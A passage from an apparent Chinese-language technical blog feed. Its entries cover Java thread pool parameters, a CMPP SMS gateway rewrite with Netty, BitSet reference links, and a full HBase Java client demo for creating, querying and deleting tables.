        <content type="html"><![CDATA[<p>源于面试的时候被问到了一个问题，创建线程池需要什么参数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ThreadPoolExecutor(<span class="type">int</span> corePoolSize, <span class="type">int</span> maximumPoolSize, <span class="type">long</span> keepAliveTime,TimeUnit unit,BlockingQueue&lt;Runnable&gt; workQueue,ThreadFactory threadFactory,RejectedExecutionHandler handler) </span><br></pre></td></tr></table></figure><p>然后就是，创建好了，我不停的往里面塞线程，那么比如说我创建的是size是10的线程池，那么我塞第11个线程池的时候，此时发生了什么。读文下面两个文章就理解了。</p><ul><li><a href="http://www.cnblogs.com/dolphin0520/p/3932921.html">Java并发编程：线程池的使用</a></li><li><a href="http://blog.csdn.net/menxu_work/article/details/9358795"> ThreadPoolExecutor使用和思考-线程池大小设置与BlockingQueue的三种实现区别</a></li></ul><p>那天面试的那个人说了JDK里面这里有一个注释。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line"> * Proceed in 3 steps:</span><br><span class="line"> *</span><br><span class="line"> * 1. If fewer than corePoolSize threads are running, try to</span><br><span class="line"> * start a new thread with the given command as its first</span><br><span class="line"> * task.  The call to addWorker atomically checks runState and</span><br><span class="line"> * workerCount, and so prevents false alarms that would add</span><br><span class="line"> * threads when it shouldn&#x27;t, by returning false.</span><br><span class="line"> *</span><br><span class="line"> * 2. If a task can be successfully queued, then we still need</span><br><span class="line"> * to double-check whether we should have added a thread</span><br><span class="line"> * (because existing ones died since last checking) or that</span><br><span class="line"> * the pool shut down since entry into this method. So we</span><br><span class="line"> * recheck state and if necessary roll back the enqueuing if</span><br><span class="line"> * stopped, or start a new thread if there are none.</span><br><span class="line"> *</span><br><span class="line"> * 3. If we cannot queue task, then we try to add a new</span><br><span class="line"> * thread.  If it fails, we know we are shut down or saturated</span><br><span class="line"> * and so reject the task.</span><br><span class="line"> */</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 线程池 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CMPP中国移动短信网关</title>
      <link href="/2017/07/18/CMPP%E4%B8%AD%E5%9B%BD%E7%A7%BB%E5%8A%A8%E7%9F%AD%E4%BF%A1%E7%BD%91%E5%85%B3/"/>
      <url>/2017/07/18/CMPP%E4%B8%AD%E5%9B%BD%E7%A7%BB%E5%8A%A8%E7%9F%AD%E4%BF%A1%E7%BD%91%E5%85%B3/</url>
      
        <content type="html"><![CDATA[<p>最近的短信系统久经波折终于要准备上线了。可以写一个总结。</p><p>CMPP是中国移动的短信网关，提供了TCP长链接／短链接接入方法。在这次重构的时候，把以前用的Socket流替换为Netty NIO实现一次。说说遇到了什么坑吧。</p>]]></content>
      
      
      <categories>
          
          <category> Others </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CMPP </tag>
            
            <tag> 短信网关 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BitSet</title>
      <link href="/2017/07/18/BitSet/"/>
      <url>/2017/07/18/BitSet/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="http://www.cnblogs.com/lqminn/archive/2012/08/30/2664122.html">BitSet的源码研究</a></li><li><a href="http://blog.csdn.net/u013291394/article/details/50211181">大数据常用技巧之位图法</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Big Data </category>
          
      </categories>
      
      
        <tags>
            
            <tag> BitSet </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HBaseTest.java 一例</title>
      <link href="/2017/07/18/HbaseTest.java%20%E4%B8%80%E4%BE%8B/"/>
      <url>/2017/07/18/HbaseTest.java%20%E4%B8%80%E4%BE%8B/</url>
      
        <content type="html"><![CDATA[<p>抄的一段 Hbase 的 demo 代码，包含了些基本操作</p><p>添加依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.hbase<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>hbase-client<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.6<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><span id="more"></span><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.hadoop.conf.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.hbase.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.hbase.client.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.hbase.filter.CompareFilter.CompareOp;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.hbase.filter.Filter;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.hbase.filter.FilterList;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.hbase.filter.SingleColumnValueFilter;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.hbase.util.Bytes;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HBaseTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 声明静态配置，配置zookeeper</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">Configuration</span> <span class="variable">configuration</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        configuration = HBaseConfiguration.create();</span><br><span class="line"><span class="comment">//        configuration.set(&quot;hbase.zookeeper.quorum&quot;, &quot;study-90:2181,study-91:2181,study-92:2181&quot;);</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            connection = ConnectionFactory.createConnection(configuration);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 创建表</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">createTable</span><span class="params">(String tableStr, String[] familyNames)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;start create table ......&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Admin</span> <span class="variable">admin</span> <span class="operator">=</span> connection.getAdmin();</span><br><span class="line">            <span class="type">TableName</span> <span class="variable">tableName</span> <span class="operator">=</span> TableName.valueOf(tableStr);</span><br><span class="line">            <span class="keyword">if</span> (admin.tableExists(tableName)) &#123;<span class="comment">// 如果存在要创建的表，那么先删除，再创建</span></span><br><span class="line">                admin.disableTable(tableName);</span><br><span class="line">                admin.deleteTable(tableName);</span><br><span class="line">                System.out.println(tableName + <span class="string">&quot; is exist,detele....&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">HTableDescriptor</span> <span class="variable">tableDescriptor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HTableDescriptor</span>(tableName);</span><br><span class="line">            <span class="comment">// 添加表列信息</span></span><br><span class="line">            <span class="keyword">if</span> (familyNames != <span class="literal">null</span> &amp;&amp; familyNames.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">for</span> (String familyName : familyNames) &#123;</span><br><span class="line">                    tableDescriptor.addFamily(<span class="keyword">new</span> <span class="title class_">HColumnDescriptor</span>(familyName));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            admin.createTable(tableDescriptor);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;end create table ......&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 添加行列数据数据</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">insertData</span><span class="params">(String tableName, String rowId, String familyName, String qualifier, String value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;start insert data ......&quot;</span>);</span><br><span class="line">        <span class="type">Table</span> <span class="variable">table</span> <span class="operator">=</span> connection.getTable(TableName.valueOf(tableName));</span><br><span class="line">        <span class="type">Put</span> <span class="variable">put</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Put</span>(rowId.getBytes());<span class="comment">// 一个PUT代表一行数据，再NEW一个PUT表示第二行数据,每行一个唯一的ROWKEY，此处rowkey为put构造方法中传入的值</span></span><br><span class="line">        put.addColumn(familyName.getBytes(), qualifier.getBytes(), value.getBytes());<span class="comment">// 本行数据的第一列</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            table.put(put);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;end insert data ......&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 删除行</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">deleteRow</span><span class="params">(String tablename, String rowkey)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Table</span> <span class="variable">table</span> <span class="operator">=</span> connection.getTable(TableName.valueOf(tablename));</span><br><span class="line">            <span class="type">Delete</span> <span class="variable">d1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Delete</span>(rowkey.getBytes());</span><br><span class="line">            table.delete(d1);<span class="comment">//d1.addColumn(family, qualifier);d1.addFamily(family);</span></span><br><span class="line">            System.out.println(<span class="string">&quot;删除行成功!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 查询所有数据</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">queryAll</span><span class="params">(String tableName)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Table</span> <span class="variable">table</span> <span class="operator">=</span> connection.getTable(TableName.valueOf(tableName));</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ResultScanner</span> <span class="variable">rs</span> <span class="operator">=</span> table.getScanner(<span class="keyword">new</span> <span class="title class_">Scan</span>());</span><br><span class="line">            <span class="keyword">for</span> (Result r : rs) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;获得到rowkey:&quot;</span> + <span class="keyword">new</span> <span class="title class_">String</span>(r.getRow()));</span><br><span class="line">                <span class="keyword">for</span> (Cell keyValue : r.rawCells()) &#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;列：&quot;</span> + <span class="keyword">new</span> <span class="title class_">String</span>(CellUtil.cloneFamily(keyValue)) + <span class="string">&quot;:&quot;</span> + <span class="keyword">new</span> <span class="title class_">String</span>(CellUtil.cloneQualifier(keyValue)) + <span class="string">&quot;====值:&quot;</span> + <span class="keyword">new</span> <span class="title class_">String</span>(CellUtil.cloneValue(keyValue)));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            rs.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 根据rowId查询</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">queryByRowId</span><span class="params">(String tableName, String rowId)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Table</span> <span class="variable">table</span> <span class="operator">=</span> connection.getTable(TableName.valueOf(tableName));</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Get</span> <span class="variable">scan</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Get</span>(rowId.getBytes());<span class="comment">// 根据rowkey查询</span></span><br><span class="line">            <span class="type">Result</span> <span class="variable">r</span> <span class="operator">=</span> table.get(scan);</span><br><span class="line">            System.out.println(<span class="string">&quot;获得到rowkey:&quot;</span> + <span class="keyword">new</span> <span class="title class_">String</span>(r.getRow()));</span><br><span class="line">            <span class="keyword">for</span> (Cell keyValue : r.rawCells()) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;列：&quot;</span> + <span class="keyword">new</span> <span class="title class_">String</span>(CellUtil.cloneFamily(keyValue)) + <span class="string">&quot;:&quot;</span> + <span class="keyword">new</span> <span class="title class_">String</span>(CellUtil.cloneQualifier(keyValue)) + <span class="string">&quot;====值:&quot;</span> + <span class="keyword">new</span> <span class="title class_">String</span>(CellUtil.cloneValue(keyValue)));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 根据列条件查询</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">queryByCondition</span><span class="params">(String tableName, String familyName, String qualifier, String value)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Table</span> <span class="variable">table</span> <span class="operator">=</span> connection.getTable(TableName.valueOf(tableName));</span><br><span class="line">            <span class="type">Filter</span> <span class="variable">filter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SingleColumnValueFilter</span>(Bytes.toBytes(familyName), Bytes.toBytes(qualifier), CompareOp.EQUAL, Bytes.toBytes(value)); <span class="comment">// 当列familyName的值为value时进行查询</span></span><br><span class="line">            <span class="type">Scan</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scan</span>();</span><br><span class="line">            s.setFilter(filter);</span><br><span class="line">            <span class="type">ResultScanner</span> <span class="variable">rs</span> <span class="operator">=</span> table.getScanner(s);</span><br><span class="line">            <span class="keyword">for</span> (Result r : rs) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;获得到rowkey:&quot;</span> + <span class="keyword">new</span> <span class="title class_">String</span>(r.getRow()));</span><br><span class="line">                <span class="keyword">for</span> (Cell keyValue : r.rawCells()) &#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;列：&quot;</span> + <span class="keyword">new</span> <span class="title class_">String</span>(CellUtil.cloneFamily(keyValue)) + <span class="string">&quot;:&quot;</span> + <span class="keyword">new</span> <span class="title class_">String</span>(CellUtil.cloneQualifier(keyValue)) + <span class="string">&quot;====值:&quot;</span> + <span class="keyword">new</span> <span class="title class_">String</span>(CellUtil.cloneValue(keyValue)));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            rs.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 多条件查询</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">queryByConditions</span><span class="params">(String tableName, String[] familyNames, String[] qualifiers, String[] values)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Table</span> <span class="variable">table</span> <span class="operator">=</span> connection.getTable(TableName.valueOf(tableName));</span><br><span class="line">            List&lt;Filter&gt; filters = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">            <span class="keyword">if</span> (familyNames != <span class="literal">null</span> &amp;&amp; familyNames.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">for</span> (String familyName : familyNames) &#123;</span><br><span class="line">                    <span class="type">Filter</span> <span class="variable">filter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SingleColumnValueFilter</span>(Bytes.toBytes(familyName), Bytes.toBytes(qualifiers[i]), CompareOp.EQUAL, Bytes.toBytes(values[i]));</span><br><span class="line">                    filters.add(filter);</span><br><span class="line">                    i++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">FilterList</span> <span class="variable">filterList</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterList</span>(filters);</span><br><span class="line">            <span class="type">Scan</span> <span class="variable">scan</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scan</span>();</span><br><span class="line">            scan.setFilter(filterList);</span><br><span class="line">            <span class="type">ResultScanner</span> <span class="variable">rs</span> <span class="operator">=</span> table.getScanner(scan);</span><br><span class="line">            <span class="keyword">for</span> (Result r : rs) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;获得到rowkey:&quot;</span> + <span class="keyword">new</span> <span class="title class_">String</span>(r.getRow()));</span><br><span class="line">                <span class="keyword">for</span> (Cell keyValue : r.rawCells()) &#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;列：&quot;</span> + <span class="keyword">new</span> <span class="title class_">String</span>(CellUtil.cloneFamily(keyValue)) + <span class="string">&quot;:&quot;</span> + <span class="keyword">new</span> <span class="title class_">String</span>(CellUtil.cloneQualifier(keyValue)) + <span class="string">&quot;====值:&quot;</span> + <span class="keyword">new</span> <span class="title class_">String</span>(CellUtil.cloneValue(keyValue)));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            rs.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 删除表</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">dropTable</span><span class="params">(String tableStr)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Admin</span> <span class="variable">admin</span> <span class="operator">=</span> connection.getAdmin();</span><br><span class="line">            <span class="type">TableName</span> <span class="variable">tableName</span> <span class="operator">=</span> TableName.valueOf(tableStr);</span><br><span class="line">            admin.disableTable(tableName);</span><br><span class="line">            admin.deleteTable(tableName);</span><br><span class="line">            admin.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//创建表</span></span><br><span class="line">        createTable(<span class="string">&quot;t_table&quot;</span>, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;f1&quot;</span>, <span class="string">&quot;f2&quot;</span>, <span class="string">&quot;f3&quot;</span>&#125;);</span><br><span class="line">        <span class="comment">//添加数据</span></span><br><span class="line">        insertData(<span class="string">&quot;t_table&quot;</span>, <span class="string">&quot;row-0001&quot;</span>, <span class="string">&quot;f1&quot;</span>, <span class="string">&quot;a&quot;</span>, <span class="string">&quot;fffaaa&quot;</span>);</span><br><span class="line">        insertData(<span class="string">&quot;t_table&quot;</span>, <span class="string">&quot;row-0001&quot;</span>, <span class="string">&quot;f2&quot;</span>, <span class="string">&quot;b&quot;</span>, <span class="string">&quot;fffbbb&quot;</span>);</span><br><span class="line">        insertData(<span class="string">&quot;t_table&quot;</span>, <span class="string">&quot;row-0001&quot;</span>, <span class="string">&quot;f3&quot;</span>, <span class="string">&quot;c&quot;</span>, <span class="string">&quot;fffccc&quot;</span>);</span><br><span class="line">        insertData(<span class="string">&quot;t_table&quot;</span>, <span class="string">&quot;row-0002&quot;</span>, <span class="string">&quot;f1&quot;</span>, <span class="string">&quot;a&quot;</span>, <span class="string">&quot;eeeeee&quot;</span>);</span><br><span class="line">        <span class="comment">//查询全部数据</span></span><br><span class="line">        queryAll(<span class="string">&quot;t_table&quot;</span>);</span><br><span class="line">        <span class="comment">//根据rowid查询数据</span></span><br><span class="line">        queryByRowId(<span class="string">&quot;t_table&quot;</span>, <span class="string">&quot;row-0001&quot;</span>);</span><br><span class="line">        <span class="comment">//列条件查询</span></span><br><span class="line">        queryByCondition(<span class="string">&quot;t_table&quot;</span>, <span class="string">&quot;f1&quot;</span>, <span class="string">&quot;a&quot;</span>, <span class="string">&quot;eeeeee&quot;</span>);</span><br><span class="line">        <span class="comment">//多条件查询</span></span><br><span class="line">        queryByConditions(<span class="string">&quot;t_table&quot;</span>, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;f1&quot;</span>, <span class="string">&quot;f3&quot;</span>&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;a&quot;</span>, <span class="string">&quot;c&quot;</span>&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;fffaaa&quot;</span>, <span class="string">&quot;fffccc&quot;</span>&#125;);</span><br><span class="line">        <span class="comment">//删除记录</span></span><br><span class="line">        deleteRow(<span class="string">&quot;t_table&quot;</span>, <span class="string">&quot;row-0001&quot;</span>);</span><br><span class="line">        <span class="comment">//删除表</span></span><br><span class="line">        dropTable(<span class="string">&quot;t_table&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Big Data </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HBase </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HBase 安装</title>
      <link href="/2017/07/18/Hbase%20%E5%AE%89%E8%A3%85/"/>
      <url>/2017/07/18/Hbase%20%E5%AE%89%E8%A3%85/</url>
      
